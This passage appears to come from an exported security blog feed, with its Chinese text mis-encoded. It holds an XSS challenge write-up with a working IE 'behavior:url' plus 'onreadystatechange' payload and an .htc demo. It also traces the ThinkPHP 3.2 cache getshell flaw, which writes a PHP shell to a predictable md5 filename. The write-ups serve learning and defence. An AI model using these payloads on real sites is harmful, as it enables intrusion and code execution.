    <content><![CDATA[<!-- åªæ€è€ƒäº†è¿™é“é¢˜ï¼Œç„¶åå°±é™·è¿›å»äº†ã€‚å…ˆæ¥çœ‹é¢˜ï¼Œè€ƒç‚¹æ˜¯è¾“å‡ºç‚¹å‡ºç°åœ¨input hiddenæ¡†é‡Œé¢ï¼Œå› ä¸ºæ–‡æœ¬æ¡†è¢«éšè—ä¸€èˆ¬çš„å’Œç‚¹å‡»æœ‰å…³çš„äº‹ä»¶ï¼ˆå¦‚ onfocusï¼‰å°±ä¸ä¼šè¢«è§¦å‘äº†ã€‚ -->
<!-- more -->
<h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>åªæ€è€ƒäº†è¿™é“é¢˜ï¼Œç„¶åå°±é™·è¿›å»äº†ã€‚å…ˆæ¥çœ‹é¢˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'X-XSS-Protection:0'</span>);</span><br><span class="line">header(<span class="string">'Content-Type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"x-ua-compatible"</span> content=<span class="string">"IE=10"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">''</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">'hidden'</span> name=<span class="string">'token'</span> value=<span class="string">'&lt;?php</span></span><br><span class="line"><span class="string">  echo htmlspecialchars($_GET['</span>token<span class="string">']); ?&gt;'</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">'submit'</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>è€ƒç‚¹æ˜¯è¾“å‡ºç‚¹å‡ºç°åœ¨input hiddenæ¡†é‡Œé¢ï¼Œå› ä¸ºæ–‡æœ¬æ¡†è¢«éšè—ä¸€èˆ¬çš„å’Œç‚¹å‡»æœ‰å…³çš„äº‹ä»¶ï¼ˆå¦‚ onfocusï¼‰å°±ä¸ä¼šè¢«è§¦å‘äº†ã€‚</p>
<p>ä¼ ç»Ÿçš„è§£æ³•å¤§æ¦‚æœ‰ä¸‰ç§</p>
<p>ç¬¬ä¸€ç§ï¼šIE6ä¸‹ç”¨cssçš„expressionå±æ€§è§¦å‘</p>
<p>ç¬¬äºŒç§ï¼šfirefoxç”¨accesskey=â€Xâ€ onclick=alert(),ç„¶åshift+alt+x è§¦å‘</p>
<p>ç¬¬ä¸‰ç§ï¼šå¦‚æœè¾“å…¥ç‚¹åœ¨<code>type=hidden</code>å‰å¯ä»¥ç”¨å¦å¤–ä¸€ä¸ªtypeå¦‚<code>type=text</code>å°†<code>type=hidden</code>è¦†ç›–æ‰ï¼ˆè¿™é“é¢˜ä¸è¡Œï¼‰</p>
<p>æ˜¾ç„¶ä¼ ç»Ÿçš„åŠæ³•è‚¯å®šä¸ä¼šé€šè¿‡çš„ï¼ˆè§„åˆ™æ˜¯ï¼šéœ€è¦æœ€æ–°æµè§ˆå™¨ï¼Œä¸éœ€è¦äº¤äº’ï¼‰</p>
<p>ç„¶åæˆ‘å°±å¼€å§‹äº†æ¼«æ¼«çš„è¸©å‘è·¯ã€‚å› ä¸ºæºç ä¸­æœ‰<code>&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;</code>æ‰€ä»¥æˆ‘è®¤ä¸ºxssæ˜¯åœ¨IEä¸‹è§¦å‘.ç„¶åæ‰“å¼€<a href="https://msdn.microsoft.com/zh-cn/library/ms535835(v=vs.85).aspx">input=hiddençš„å®˜æ–¹æ‰‹å†Œ</a>æƒŠå–œçš„å‘ç°<code>input hidden</code>ä¸‹è¿˜æœ‰on*äº‹ä»¶</p>
<p><img src="%E6%8D%95%E8%8E%B7.PNG" alt="æ•è·.PNG"></p>
<p>ç„¶åç™¾åº¦äº†ä¸€ä¸‹ç”¨æ³•</p>
<ul>
<li><p>onbeforedeactivate<br>Fires immediately before the activeElement is changed from the current object to another object in the parent document.<br>åœ¨ activeElement ä»å½“å‰å¯¹è±¡å˜ä¸ºçˆ¶æ–‡æ¡£å…¶å®ƒå¯¹è±¡ä¹‹å‰ç«‹å³è§¦å‘ã€‚ä¸æ‡‚~</p>
</li>
<li><p>ondatasetcomplete<br>Fires to indicate that all data is available from the data source object.<br>æ•°æ®åœ¨æ•°æ®æºå‘ç”Ÿå˜åŒ–æ—¶è§¦å‘çš„äº‹ä»¶ï¼Œä¸æ‡‚~</p>
</li>
<li><p>oninvalid<br>Provides specified alert text if an input element is invalid.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">oninvalid</span>=<span class="string">"alert('è¯¥é¡¹ä¸èƒ½ç©º!');"</span> <span class="attr">name</span>=<span class="string">"fname"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">maxlength</span>=<span class="string">"11"</span> <span class="attr">pattern</span>=<span class="string">"^(0|86|17951)?1[0-9]&#123;10&#125;"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">oninvalid</span>=<span class="string">"setCustomValidity('è¯·è¾“å…¥11ä½æ‰‹æœºå·');"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>onselect<br>onselect äº‹ä»¶ä¼šåœ¨æ–‡æœ¬æ¡†ä¸­çš„æ–‡æœ¬è¢«é€‰ä¸­æ—¶å‘ç”Ÿã€‚<br>Fires when the current selection changes.<br>onpropertychange<br>åŠ¨æ€ç›‘å¬è¾“å…¥æ¡†å€¼å˜åŒ–çš„æƒ…å†µï¼Œæ¯”å¦‚valueå±æ€§çš„å€¼æ”¹å˜æ—¶ä¼šè§¦å‘</p>
</li>
</ul>
<p>å‰ä¸¤ä¸ªä¸æ˜¯å¾ˆæ‡‚ä»€ä¹ˆæ„æ€ï¼Œè¯•äº†åä¸‰ä¸ªéƒ½ä¸è¡Œ</p>
<p>oninvalidï¼šoninvalidä¸€èˆ¬æƒ…å†µä¸‹å¿…é¡»è¦é…åˆ<code>required</code>æˆ–è€…<code>pattern</code>,å¯æƒœçš„æ˜¯hiddenä¸‹å‡ä¸æ”¯æŒ</p>
<p>onselectï¼šæ˜¾ç„¶æ¡†éƒ½éšè—äº†ï¼Œä¸å¯èƒ½è¿˜éœ€è¦æ–‡æœ¬ï¼Œå†µä¸”éœ€è¦äº¤äº’ã€‚</p>
<p>onpropertychangeï¼šæ˜¯ä¸€ä¸ªæ­»é€»è¾‘ï¼Œæƒ³æ”¹å˜valueå€¼å°±è®¸å¿…é¡»æœ‰ä¸ªjsè§¦å‘ç‚¹ç„¶åç”¨DOMï¼Œä¸è¿‡æ—¢ç„¶éƒ½æœ‰è§¦æ³•ç‚¹äº†è°è¿˜ä¼šç”¨è¿™ä¸ªå±æ€§ï¼ˆè¿™é“é¢˜è€Œè¨€ï¼‰</p>
<p>ç„¶åæˆ‘å°±è’™è”½äº†ï¼Œæ—¢ç„¶é€šå¸¸æƒ…å†µä¸‹éƒ½ä¸è¡Œï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜ä¼šå†™åœ¨<code>input type=hidden</code>ä¸‹é¢ï¼Œé»‘äººé—®å·ï¼Ÿï¼Ÿï¼Ÿ</p>
<p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="æ•è·3.PNG"></p>
<p>æœ€åçœ‹åˆ°äº†æŸ æª¬å¸ˆå‚…çš„æ­£ç¡®ç­”æ¡ˆ</p>
<p><code>token=&#39; style=behavior:url(x) onreadystatechange=alert(1) &#39;</code></p>
<p>åæ¥æŸ¥èµ„æ–™å‘ç°è¿™æ˜¯ä¸€ä¸ªIE6~IE10æ”¯æŒçš„ä¸€ä¸ªcssçš„è¯­æ³•ï¼Œbehavior:url(???)å…è®¸è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨çš„.htcæ–‡ä»¶æ¥ä¿®æ”¹HTMLçš„è¡Œä¸ºå’Œæ–¹æ³•ï¼ˆä½†æ˜¯å—åŒæºç­–ç•¥å½±å“ï¼‰å…·ä½“è¯­æ³•å¯ä»¥çœ‹</p>
<p>å¦‚æœæˆåŠŸå°±æœ‰ä¸Šä¼ htcæ–‡ä»¶ï¼ˆå¯ä»¥å†™æ›´å¤æ‚çš„åˆ©ç”¨ä»£ç è€Œæ²¡æœ‰é•¿åº¦é™åˆ¶ï¼‰é…åˆxssè¿™ä¸ªæ€è·¯ã€‚å› ä¸º</p>
<p>.htc files are commonly used in .css files using an IE specific property called behavior, using this along with the .htc file allows the browser to run JavaScript code which is whats contained within the file.</p>
<p>ä¸‹é¢æ˜¯æ˜¯ä¸€ä¸ªåˆ©ç”¨demo</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">ã€€ã€€ã€€ã€€ã€€ã€€<span class="selector-tag">h1</span> &#123; <span class="attribute">behavior</span>: <span class="built_in">url</span>(behave.htc) &#125;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>æŠŠé¼ æ ‡æ”¾åœ¨è¿™é‡Œ poluoluo.com<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attach</span> <span class="attr">for</span>=<span class="string">"element"</span> <span class="attr">event</span>=<span class="string">"onmouseover"</span> <span class="attr">handler</span>=<span class="string">"hig_lite"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attach</span> <span class="attr">for</span>=<span class="string">"element"</span> <span class="attr">event</span>=<span class="string">"onmouseout"</span> <span class="attr">handler</span>=<span class="string">"low_lite"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">alert(1);</span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">hig_lite</span><span class="params">()</span></span></span></span><br><span class="line">&#123;</span><br><span class="line">ã€€ã€€element.style.color=255</span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">low_lite</span><span class="params">()</span></span></span></span><br><span class="line">&#123;</span><br><span class="line">ã€€ã€€element.style.color=0</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>å¦‚æœ‰å‡ºé”™,è¿˜è¯·æŒ‡æ•™</p>
<p>å¼€å­¦å¿«ä¹ï¼ï¼</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>TPæ¡†æ¶3.2ç¼“å­˜æ¼æ´</title>
    <url>/2017/08/20/TP%E6%A1%86%E6%9E%B63.2%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<!-- ä¹‹å‰å­¦phpçš„æ—¶å€™å°±å¯¹phpé‡Œé¢çš„ç¼“å­˜æŠ€æœ¯å¾ˆç–‘æƒ‘ï¼Œå‰äº›æ—¥å­çˆ†å‡ºçš„[thinkphpç¼“å­˜getshellæ¼æ´](https://xianzhi.aliyun.com/forum/read/1973.html)çœ‹ç€å¤§ä½¬è¿½äº†ä¸€ä¾¿ä»£ç ï¼Œè‡ªå·±ä¹Ÿæƒ³å°è¯•è¿½ä¸€ä¸‹ï¼Œé¡ºä¾¿äº†è§£ä¸€ä¸‹ä½•ä¸ºç¼“å­˜ã€‚å®éªŒç”¨çš„æ˜¯TP3.2æœ‰æ­¤æ¼æ´çš„ç‰ˆæœ¬ã€‚ -->
<!-- more -->

<h2 id="ä½•ä¸ºç¼“å­˜ï¼Ÿ"><a href="#ä½•ä¸ºç¼“å­˜ï¼Ÿ" class="headerlink" title="ä½•ä¸ºç¼“å­˜ï¼Ÿ"></a>ä½•ä¸ºç¼“å­˜ï¼Ÿ</h2><p>å…·ä½“<a href="http://www.thinkphp.cn/code/1579.html">http://www.thinkphp.cn/code/1579.html</a></p>
<p>ç®€å•çš„è¯´å°±æ˜¯å‡å°‘æœåŠ¡å™¨å‹åŠ›ï¼Œå°†ç”¨æˆ·å¸¸è§çš„çš„ç½‘é¡µäº‹å…ˆé™æ€å­˜å‚¨å¥½ã€‚ä¸ªäººè®¤ä¸ºï¼Œä¸€èˆ¬æƒ…å†µä¸‹TPç”¨çš„æ˜¯æ•°æ®ç¼“å­˜ï¼Œå³å°†æ•°æ®ç¼“å­˜åˆ°ä¸€ä¸ªphpæ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶ååŒ…å«ä¸€ä¸ªidæ¥å”¯ä¸€æ ‡ç¤ºï¼ˆTPä¸­æ˜¯ä¸€ä¸ªmd5å€¼ï¼‰</p>
<h2 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h2><h3 id="é…ç½®æ•°æ®åº“"><a href="#é…ç½®æ•°æ®åº“" class="headerlink" title="é…ç½®æ•°æ®åº“"></a>é…ç½®æ•°æ®åº“</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">database</span> article</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> article (</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line">'DB_NAME' =&gt; 'aritcle' -- åœ¨config.phpä¸­æ·»åŠ è¯¥é”®å€¼å¯¹</span><br></pre></td></tr></table></figure>

<h3 id="å†™å…¥ä»£ç "><a href="#å†™å…¥ä»£ç " class="headerlink" title="å†™å…¥ä»£ç "></a>å†™å…¥ä»£ç </h3><p>ä¿®æ”¹home/controller/indexController.class.php å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"welcome"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$content = <span class="keyword">array</span>(<span class="string">'content'</span> =&gt; I(<span class="string">'get.content'</span>));</span><br><span class="line">		$amodel = M(<span class="string">'article'</span>);</span><br><span class="line">		$amodel-&gt;data($content)-&gt;add();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cache</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$amodel = M(<span class="string">'article'</span>);</span><br><span class="line">		$content = $amodel-&gt;select();</span><br><span class="line">		var_dump($content);</span><br><span class="line">		S(<span class="string">'content'</span>,$content,<span class="number">3600</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ç¼“å­˜å‡½æ•°ç”¨æ³•"><a href="#ç¼“å­˜å‡½æ•°ç”¨æ³•" class="headerlink" title="ç¼“å­˜å‡½æ•°ç”¨æ³•"></a>ç¼“å­˜å‡½æ•°ç”¨æ³•</h2><p>åœ¨TP3.2ç‰ˆæœ¬ä¸­ï¼Œèµ·ç¼“å­˜åŠŸèƒ½çš„æ˜¯Så‡½æ•°ï¼Œç”¨æ³•å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨dataæ ‡è¯†ç¼“å­˜$Dataæ•°æ®</span></span><br><span class="line">S(<span class="string">'data'</span>,$Data);  <span class="comment">//å‰é¢çš„æ˜¯ç¼“å­˜æ ‡ç¤ºï¼Œåé¢çš„æ˜¯ç¼“å­˜çš„æ•°æ®</span></span><br><span class="line"><span class="comment">// ç¼“å­˜$Dataæ•°æ®3600ç§’</span></span><br><span class="line">S(<span class="string">'data'</span>,$Data,<span class="number">3600</span>);</span><br><span class="line"><span class="comment">// åˆ é™¤ç¼“å­˜æ•°æ®</span></span><br><span class="line">S(<span class="string">'data'</span>,<span class="keyword">NULL</span>);  <span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ—¶ç¼“å­˜çš„æ ‡è¯†å</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¸‹é¢ä¸ºç¬¬ä¸€æ¬¡åˆ›å»ºç¼“å­˜ï¼ˆç†æƒ³æƒ…å†µä¸‹ï¼‰çš„ä»£ç è·Ÿè¸ª"><a href="#ä¸‹é¢ä¸ºç¬¬ä¸€æ¬¡åˆ›å»ºç¼“å­˜ï¼ˆç†æƒ³æƒ…å†µä¸‹ï¼‰çš„ä»£ç è·Ÿè¸ª" class="headerlink" title="ä¸‹é¢ä¸ºç¬¬ä¸€æ¬¡åˆ›å»ºç¼“å­˜ï¼ˆç†æƒ³æƒ…å†µä¸‹ï¼‰çš„ä»£ç è·Ÿè¸ª"></a>ä¸‹é¢ä¸ºç¬¬ä¸€æ¬¡åˆ›å»ºç¼“å­˜ï¼ˆç†æƒ³æƒ…å†µä¸‹ï¼‰çš„ä»£ç è·Ÿè¸ª</h2><p>è·Ÿè¿›Så‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç¼“å­˜ç®¡ç†</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $name ç¼“å­˜åç§°ï¼Œå¦‚æœä¸ºæ•°ç»„è¡¨ç¤ºè¿›è¡Œç¼“å­˜è®¾ç½®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value ç¼“å­˜å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $options ç¼“å­˜å‚æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">S</span><span class="params">($name,$value=<span class="string">''</span>,$options=null)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $cache   =   <span class="string">''</span>;</span><br><span class="line">	<span class="comment">/*çœç•¥*/</span></span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="keyword">empty</span>($cache)) &#123; <span class="comment">// è‡ªåŠ¨åˆå§‹åŒ–</span></span><br><span class="line">        $cache      =   Think\Cache::getInstance();<span class="comment">//åˆ›å»ºç¼“å­˜æ—¶ä»è¿™é‡Œè¿›å…¥</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">''</span>=== $value)&#123; <span class="comment">// è·å–ç¼“å­˜</span></span><br><span class="line">        <span class="keyword">return</span> $cache-&gt;get($name);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(is_null($value)) &#123; <span class="comment">// åˆ é™¤ç¼“å­˜</span></span><br><span class="line">        <span class="keyword">return</span> $cache-&gt;rm($name);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; <span class="comment">// ç¼“å­˜æ•°æ®</span></span><br><span class="line">        <span class="comment">/*çœç•¥*/</span></span><br><span class="line">        <span class="keyword">return</span> $cache-&gt;set($name, $value, $expire);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºç¼“å­˜æ—¶è¿›å…¥<code>Think\Cache::getInstance()</code>ï¼Œè¿™ä¸ªæ–¹æ³•æ£€ç´¢é™æ€æ•°ç»„æ˜¯å¦å·²ç»æœ‰ç¼“å­˜å®ä¾‹ï¼Œå¦‚æœæœ‰å°±è¿”å›ï¼Œæ²¡æœ‰åˆ™åˆ›å»ºã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å–å¾—ç¼“å­˜ç±»å®ä¾‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span><span class="params">($type=<span class="string">''</span>,$options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">static</span> $_instance	=	<span class="keyword">array</span>();<span class="comment">//é™æ€å˜é‡ï¼Œå‚¨å­˜æ‰€æœ‰åˆ›å»ºçš„ç¼“å­˜å®ä¾‹</span></span><br><span class="line">      $guid	=	$type.to_guid_string($options);<span class="comment">//è¿”å›ä¸€ä¸ªmd5ç¼–å·ï¼Œä»¥å¾…ç¨åä½œä¸ºæ•°ç»„é”®å€¼</span></span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">isset</span>($_instance[$guid]))&#123;<span class="comment">//å¦‚æœç¼“å­˜å®ä¾‹ä¸å­˜åœ¨åˆ™åˆ›å»º</span></span><br><span class="line">          $obj	=	<span class="keyword">new</span> Cache();</span><br><span class="line">          $_instance[$guid]	=	$obj-&gt;connect($type,$options);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $_instance[$guid];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>md5æ ‡è¯†å·ç”Ÿæˆæ–¹å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®PHPå„ç§ç±»å‹å˜é‡ç”Ÿæˆå”¯ä¸€æ ‡è¯†å·</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $mix å˜é‡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">to_guid_string</span><span class="params">($mix)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*çœç•¥*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $mix = serialize($mix);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> md5($mix);<span class="comment">//è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„md5å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›<code>$obj-&gt;connect($type,$options);</code>è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨é…ç½®ä¸€äº›åˆå§‹å€¼ï¼Œæ¯”å¦‚ç¼“å­˜çš„ç±»å‹ï¼Œè·¯å¾„ä¿¡æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿æ¥ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $type ç¼“å­˜ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $options  é…ç½®æ•°ç»„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($type=<span class="string">''</span>,$options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($type))  $type = C(<span class="string">'DATA_CACHE_TYPE'</span>);<span class="comment">//å¦‚æœä¸º$typeç©ºï¼Œé»˜è®¤ç¼“å­˜ç±»å‹ä¸ºFILE</span></span><br><span class="line">    $class  =   strpos($type,<span class="string">'\\'</span>)? $type : <span class="string">'Think\\Cache\\Driver\\'</span>.ucwords(strtolower($type));            </span><br><span class="line">    <span class="keyword">if</span>(class_exists($class))</span><br><span class="line">        $cache = <span class="keyword">new</span> $class($options); </span><br><span class="line">        <span class="comment">//  å®ä¾‹åŒ–Think\Cache\Driver\FILE</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        E(L(<span class="string">'_CACHE_TYPE_INVALID_'</span>).<span class="string">':'</span>.$type);</span><br><span class="line">    <span class="keyword">return</span> $cache;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€æ­¥å†™å…¥ç¼“å­˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å†™å…¥ç¼“å­˜</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name ç¼“å­˜å˜é‡å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value  å­˜å‚¨æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $expire  æœ‰æ•ˆæ—¶é—´ 0ä¸ºæ°¸ä¹…</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name,$value,$expire=null)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*çœç•¥*/</span></span><br><span class="line">	$filename   =   <span class="keyword">$this</span>-&gt;filename($name);<span class="comment">//ç”Ÿæˆæ–‡ä»¶åï¼Œç†æƒ³æƒ…å†µä¸‹MD5('content')</span></span><br><span class="line">   	<span class="comment">/*çœç•¥*/</span></span><br><span class="line">    $data   =   serialize($value);</span><br><span class="line">    <span class="comment">/*çœç•¥*/</span></span><br><span class="line">    $data    = <span class="string">"&lt;?php\n//"</span>.sprintf(<span class="string">'%012d'</span>,$expire).$check.$data.<span class="string">"\n?&gt;"</span>;</span><br><span class="line">    $result  =   file_put_contents($filename,$data);</span><br><span class="line">    <span class="comment">/*çœç•¥*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³é”®ç‚¹åœ¨<code>&lt;?php\n//&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;</code></p>
<p>ç†æƒ³æƒ…å†µä¸‹è¿™é‡Œçš„åˆ©ç”¨æ¡ä»¶å¾—å¤©ç‹¬åšï¼Œå› ä¸ºä¸¤ä¸ªå°–æ‹¬å·éƒ½å†™å¥½äº†ï¼Œä¸ç”¨æ‹…å¿ƒIå‡½æ•°è¿‡æ»¤çš„é—®é¢˜ã€‚è€Œå…¶ä¸­çš„dataå°±æ˜¯ä¼ å…¥è¿›å»çš„ä¸€å¥è¯ï¼š</p>
<p>åœ¨Runtime/Tempä¸‹ getshell</p>
<p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="æ•è·4.PNG"></p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ–‡ä¸­ä¸€ç›´æåˆ°æ˜¯ç†æƒ³æƒ…å†µï¼Œè¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œè·Ÿè¸ªçš„æ—¶å€™çœç•¥äº†ä¸€äº›ä»£ç ï¼Œå…¶ä¸­æœ‰çš„æ˜¯åˆ©ç”¨çš„å‰ææ¡ä»¶ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ–‡ä¸­æåˆ°ç†æƒ³æƒ…å†µä¸‹webshellæ–‡ä»¶åæ˜¯MD5(â€˜contentâ€™)å³<code>9a0364b9e99bb480dd25e1f0284c8555</code>/åŸå› æ˜¯TPä¸­æœ‰ä¸€ä¸ªç»™MD5å€¼åŠ ç›çš„å‚æ•°å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ç”³æ˜<code>DATA_CACHE_KEY</code>ï¼Œå¦‚æœç®¡ç†å‘˜äº‹å…ˆè®¾ç½®äº†è¿™ä¸ªå‚æ•°ï¼Œæ–‡ä»¶åå°±ä¼šå˜å¾—ä¸å¯çŒœï¼Œå…·ä½“å¦‚ä¸‹</p>
